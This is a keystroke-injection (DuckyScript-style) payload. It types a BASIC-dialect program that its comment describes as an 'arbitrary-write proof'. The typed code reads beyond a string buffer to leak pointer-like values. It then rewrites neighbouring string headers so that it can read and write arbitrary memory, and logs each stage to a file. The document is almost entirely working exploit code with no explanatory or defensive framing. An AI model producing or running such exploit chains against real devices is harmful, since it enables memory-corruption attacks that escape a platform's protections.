REM dprobe_v7 arbitrary-write proof -- compact TapDucky payload
DEFAULTDELAY 40
DELAY 2000
STRINGLN VAR NSR,ZERO$=CHR$(0),I
STRINGLN VAR CAP$
STRINGLN FOR I=1 TO 18:ZERO$=ZERO$+ZERO$:NEXT
STRINGLN NSR=ARRAY$(4)
STRINGLN COPY NSR[0],0,"0000":COPY NSR[1],0,"1111"
STRINGLN COPY NSR[2],0,"2222":COPY NSR[3],0,"3333"
STRINGLN PRINT "DIST PROBE READY",1023
STRINGLN END
STRINGLN COMMON DEF P$(V#)
STRINGLN VAR S$="",J
STRINGLN FOR J=0 TO 3
STRINGLN S$=S$+CHR$(V#-FLOOR(V#/65536)*65536):V#=FLOOR(V#/65536)
STRINGLN NEXT
STRINGLN RETURN S$
STRINGLN END
STRINGLN COMMON DEF U#(S$)
STRINGLN VAR V#=0,J
STRINGLN IF LEN(S$)<4 THEN RETURN 0
STRINGLN FOR J=3 TO 0 STEP -1:V#=V#*65536+ASC(MID$(S$,J,1)):NEXT
STRINGLN RETURN V#
STRINGLN END
STRINGLN COMMON DEF PTR(V#,A)
STRINGLN RETURN V#>0 && V#<549755813888 && V#==FLOOR(V#/A)*A
STRINGLN END
STRINGLN COMMON DEF HX$(V#)
STRINGLN VAR S$="",J,A
STRINGLN FOR J=0 TO 11
STRINGLN A=V#-FLOOR(V#/16)*16
STRINGLN S$=MID$("0123456789ABCDEF",A,1)+S$
STRINGLN V#=FLOOR(V#/16)
STRINGLN NEXT
STRINGLN RETURN S$
STRINGLN END
STRINGLN COMMON DEF PLOG(S$)
STRINGLN CAP$=CAP$+S$+CHR$(10):PRINT S$:RETURN ""
STRINGLN END
STRINGLN COMMON DEF PROBE()
STRINGLN VAR V$,X$,J,V#,E0#,E1#,E2#,E3#,OB$,WB$,OD$,OD2$
STRINGLN X$=PLOG("== S1 ==")
STRINGLN V$=COPY(NSR[0],0,16)
STRINGLN FOR J=0 TO 3
STRINGLN V#=U#(MID$(V$,J*4,4))
STRINGLN X$=PLOG("W"+STR$(J)+" "+HX$(V#)+" "+STR$(PTR(V#,16)))
STRINGLN NEXT
STRINGLN E0#=U#(MID$(V$,0,4)):E1#=U#(MID$(V$,4,4)):E2#=U#(MID$(V$,8,4)):E3#=U#(MID$(V$,12,4))
STRINGLN X$=PLOG("LEN "+HX$(LEN(NSR[0])))
STRINGLN IF !PTR(E0#,16) || !PTR(E3#,16) THEN X$=PLOG("PTRBAD"):SAVEV "TXT:PROBEOUT",CAP$:RETURN 0
STRINGLN X$=PLOG("S1 OK")
STRINGLN SAVEV "TXT:PROBEOUT",CAP$
STRINGLN X$=PLOG("== S2W ==")
STRINGLN OB$=COPY(NSR[0],88,4)
STRINGLN IF OB$=="2222" THEN
STRINGLN COPY NSR[0],88,"ZZZZ"
STRINGLN WB$=COPY(NSR[0],88,4)
STRINGLN COPY NSR[0],88,OB$
STRINGLN X$=PLOG("WR "+STR$(WB$=="ZZZZ")+" "+STR$(COPY(NSR[0],88,4)==OB$))
STRINGLN ELSE
STRINGLN X$=PLOG("E2BAD "+OB$)
STRINGLN ENDIF
STRINGLN X$=PLOG("S2W OK")
STRINGLN SAVEV "TXT:PROBEOUT",CAP$
STRINGLN X$=PLOG("== S3A ==")
STRINGLN OD$=COPY(NSR[0],16,8)
STRINGLN X$=PLOG("N1 "+NSR[1])
STRINGLN COPY NSR[0],16,P$(E3#+16)+P$(4)
STRINGLN X$=PLOG("N1A "+NSR[1])
STRINGLN COPY NSR[0],16,OD$
STRINGLN X$=PLOG("N1R "+NSR[1])
STRINGLN X$=PLOG("S3A OK")
STRINGLN SAVEV "TXT:PROBEOUT",CAP$
STRINGLN X$=PLOG("== S4X ==")
STRINGLN COPY NSR[0],16,P$(E3#+16)+P$(4)
STRINGLN COPY NSR[1],0,"QQQQ"
STRINGLN X$=PLOG("XW "+STR$(COPY(NSR[0],88,4)=="QQQQ"))
STRINGLN COPY NSR[0],88,"2222"
STRINGLN COPY NSR[0],16,OD$
STRINGLN X$=PLOG("XR "+STR$(COPY(NSR[0],88,4)=="2222")+" "+STR$(NSR[1]=="0000"))
STRINGLN X$=PLOG("S4X OK")
STRINGLN SAVEV "TXT:PROBEOUT",CAP$
STRINGLN X$=PLOG("== S5M ==")
STRINGLN OD2$=COPY(NSR[0],48,8)
STRINGLN COPY NSR[0],16,P$(E0#)+P$(16)
STRINGLN X$=PLOG("MA "+STR$(COPY(NSR[1],0,16)==V$))
STRINGLN COPY NSR[0],16,P$(E2#)+P$(8)
STRINGLN X$=PLOG("MB "+STR$(COPY(NSR[1],0,8)==OD2$))
STRINGLN COPY NSR[0],16,OD$
STRINGLN X$=PLOG("MR "+STR$(NSR[1]=="0000"))
STRINGLN X$=PLOG("DONE")
STRINGLN SAVEV "TXT:PROBEOUT",CAP$
STRINGLN RETURN 1
STRINGLN END
